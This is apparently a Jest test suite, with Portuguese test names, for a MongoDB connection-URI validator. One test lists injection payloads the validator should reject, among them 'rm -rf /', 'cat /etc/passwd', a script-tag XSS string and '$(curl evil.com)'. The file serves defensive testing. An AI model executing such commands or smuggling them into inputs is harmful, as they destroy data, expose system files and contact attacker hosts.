const { validateMongoUri } = require('../src/infrastructure/database/mongodb');

describe('MongoDB URI Validation', () => {
    describe('validateMongoUri', () => {
        test('deve aceitar URI MongoDB válida com protocolo mongodb://', () => {
            const validUri = 'mongodb://localhost:27017/testdb';
            expect(validateMongoUri(validUri)).toBe(true);
        });

        test('deve aceitar URI MongoDB válida com protocolo mongodb+srv://', () => {
            const validUri = 'mongodb+srv://cluster.mongodb.net/testdb';
            expect(validateMongoUri(validUri)).toBe(true);
        });

        test('deve aceitar URI com múltiplos hosts', () => {
            const validUri = 'mongodb://host1:27017,host2:27017/testdb';
            expect(validateMongoUri(validUri)).toBe(true);
        });

        test('deve aceitar URI com IP válido', () => {
            const validUri = 'mongodb://192.168.1.100:27017/testdb';
            expect(validateMongoUri(validUri)).toBe(true);
        });

        test('deve rejeitar URI vazia', () => {
            expect(validateMongoUri('')).toBe(false);
            expect(validateMongoUri(null)).toBe(false);
            expect(validateMongoUri(undefined)).toBe(false);
        });

        test('deve rejeitar URI sem protocolo', () => {
            const invalidUri = 'localhost:27017/testdb';
            expect(validateMongoUri(invalidUri)).toBe(false);
        });

        test('deve rejeitar URI com protocolo inválido', () => {
            const invalidUri = 'http://localhost:27017/testdb';
            expect(validateMongoUri(invalidUri)).toBe(false);
        });

        test('deve rejeitar URI com caracteres suspeitos', () => {
            const suspiciousUris = [
                'mongodb://localhost:27017/testdb; DROP DATABASE',
                'mongodb://localhost:27017/testdb" OR 1=1',
                'mongodb://localhost:27017/testdb<script>alert("xss")</script>',
                'mongodb://localhost:27017/testdb`rm -rf /`',
                'mongodb://localhost:27017/testdb|cat /etc/passwd',
                'mongodb://localhost:27017/testdb&whoami',
                'mongodb://localhost:27017/testdb$(curl evil.com)',
                'mongodb://localhost:27017/testdb{malicious}',
                'mongodb://localhost:27017/testdb[injection]',
                'mongodb://localhost:27017/testdb\\backslash'
            ];

            suspiciousUris.forEach(uri => {
                expect(validateMongoUri(uri)).toBe(false);
            });
        });

        test('deve rejeitar URI com host inválido', () => {
            const invalidHosts = [
                'mongodb://invalid..host:27017/testdb',
                'mongodb://-invalid-host:27017/testdb',
                'mongodb://host-with-invalid-chars!:27017/testdb',
                'mongodb://999.999.999.999:27017/testdb', // IP inválido
                'mongodb://256.1.1.1:27017/testdb' // IP inválido
            ];

            invalidHosts.forEach(uri => {
                expect(validateMongoUri(uri)).toBe(false);
            });
        });

        test('deve aceitar URI com espaços em branco (que serão removidos)', () => {
            const uriWithSpaces = '  mongodb://localhost:27017/testdb  ';
            expect(validateMongoUri(uriWithSpaces)).toBe(true);
        });

        test('deve rejeitar URI que não é string', () => {
            expect(validateMongoUri(123)).toBe(false);
            expect(validateMongoUri({})).toBe(false);
            expect(validateMongoUri([])).toBe(false);
        });
    });
});
